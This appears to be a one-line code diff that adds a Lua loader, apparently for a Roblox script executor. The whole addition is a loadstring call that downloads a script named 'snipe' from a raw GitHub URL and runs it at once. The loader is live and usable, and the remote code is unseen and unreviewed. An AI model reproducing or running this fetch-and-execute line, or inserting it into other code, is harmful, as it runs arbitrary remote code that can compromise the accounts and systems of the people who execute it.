@@ -1,1 +1,1 @@
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/digytally3-eng/viacheck/main/snipe"))()
